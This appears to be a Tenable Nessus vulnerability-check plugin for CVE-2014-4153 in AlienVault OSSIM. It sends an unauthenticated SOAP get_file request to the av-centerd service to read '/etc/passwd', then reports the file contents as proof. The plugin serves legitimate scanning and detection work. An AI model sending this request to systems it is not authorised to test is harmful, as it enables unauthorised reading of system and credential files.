#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(76214);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_cve_id("CVE-2014-4153");
  script_bugtraq_id(68018);
  script_osvdb_id(108020);

  script_name(english:"AlienVault OSSIM 'av-centerd' get_file() Information Disclosure");
  script_summary(english:"Tries to exploit information disclosure via get_file().");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by an information disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of AlienVault Open Source
Security Information Management (OSSIM) that is affected by an
information disclosure vulnerability in the 'av-centerd' SOAP service
due to a failure to sanitize user input to the 'get_file' method. A
remote, unauthenticated attacker can exploit this vulnerability to
read arbitrary files with root privileges.

Note that this version is reportedly also affected by two remote code
execution vulnerabilities. However, Nessus did not test for these
additional issues.");
  script_set_attribute(attribute:"see_also", value:"http://forums.alienvault.com/discussion/2806");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-207/");
  script_set_attribute(attribute:"solution", value:"Upgrade to 4.8.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/06/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/06/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/06/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:alienvault:open_source_security_information_management");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("ossim_soap_detect.nbin");
  script_require_ports("www/AlienVault OSSIM 'av-centerd' SOAP Service");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("string.inc");

function _soap_create_request(tag, header, body, schema_year)
{
  local_var request;

  if (isnull(body))
    return NULL;

  if (isnull(schema_year))
    schema_year = "2001";

  if (isnull(tag))
    tag = "soapenv";

    request =
     '<?xml version="1.0" encoding="utf-8"?>
      <' + tag + ':Envelope ' + tag + ':encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
        xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
        xmlns:xsi="http://www.w3.org/' + schema_year + '/XMLSchema-instance"
        xmlns:' + tag + '="http://schemas.xmlsoap.org/soap/envelope/"
        xmlns:xsd="http://www.w3.org/' + schema_year + '/XMLSchema">';

  if (!isnull(header))
    request += '<' + tag + ':Header>' + header + '</' + tag + ':Header>';

  request +=
    '<' + tag + ':Body>' +
      body +
    '</' + tag + ':Body>
  </' + tag + ':Envelope>';

  return request;
}

function soap_send_request(soap_action, url, port, soap_tag, soap_header, request, headers, exit_on_fail)
{
  local_var result;

  if (isnull(soap_tag))
    soap_tag = "soapenv";

  if (isnull(headers))
  {
    headers = make_array(
      "Content-type", "application/soap+xml",
      "User-Agent", "Nessus SOAP v0.0.1 (Nessus.org)"
    );
  }

  headers["SOAPAction"] = soap_action;

  result = http_send_recv3(
      method       : "POST",
      item         : url,
      port         : port,
      add_headers  : headers,
      data         : _soap_create_request(tag:soap_tag, header:soap_header, body:request),
      exit_on_fail : exit_on_fail
  );

  return result;
}

app_name = "AlienVault OSSIM 'av-centerd' SOAP Service";
port = get_kb_item_or_exit('www/' + app_name);

method = 'get_file';
method_namespace = 'AV/CC/Util';
soap_action = strcat(method_namespace, '#', method);
url = "/av-centerd";
filename = '/etc/passwd';

request =
'<m:' + method + ' xmlns:m="' + method_namespace + '">
  <string>All</string>
  <string>423d7bea-cfbc-f7ea-fe52-272ff7ede3d2</string>
  <string>' + unixtime() + '</string>
  <string>' + SCRIPT_NAME + '</string>
  <string>' + filename + '</string>
</m:' + method + '>';

soap_response =
  soap_send_request(
    soap_action:soap_action,
    url:url,
    port:port,
    request:request,
    exit_on_fail:TRUE);

# Verify that we got back the contents of  command executed.
pattern = ">(root:x:0:0:root.*)";
match = eregmatch(string:soap_response[2], pattern:pattern);
if (isnull(match)) audit(AUDIT_LISTEN_NOT_VULN, app_name, port);

contents_start = stridx(soap_response[2], ">root:x:0") + 1;
contents = right(soap_response[2], strlen(soap_response[2]) - contents_start);
contents_end = stridx(contents, "</item>");
contents = strip(left(contents, contents_end));

if (report_verbosity > 0)
{
  report =
  '\n' + "Nessus was able to obtain the contents of '" + filename + "' with the" +
  '\n' + 'following request :' +
  '\n' +
  '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
  '\n' + chomp(http_last_sent_request()) + 
  '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
  '\n';

  if (contents && report_verbosity > 1)
  {
    if (
      !defined_func("nasl_level") ||
      nasl_level() < 5200 ||
      !isnull(get_preference("sc_version"))
    )
    {
      report += '\n' + 'Here are the contents :' +
                '\n' + 
                '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
                '\n' + chomp(contents) + 
                '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
                '\n';
      security_hole(port:port, extra:report);
    }
    else
    {
      # Sanitize file names
      if ("/" >< filename) filename = ereg_replace(
        pattern:"^.+/([^/]+)$", replace:"\1", string:filename);
      report += '\n' + 'Attached is a copy of the file' + '\n';
      attachments = make_list();
      attachments[0] = make_array();
      attachments[0]["type"] = "text/plain";
      attachments[0]["name"] = filename;
      attachments[0]["value"] = contents;
      security_report_with_attachments(
        port  : port,
        level : 3,
        extra : report,
        attachments : attachments
      );
    }
  }
  else security_hole(port:port, extra:report);
}
else security_hole(port);
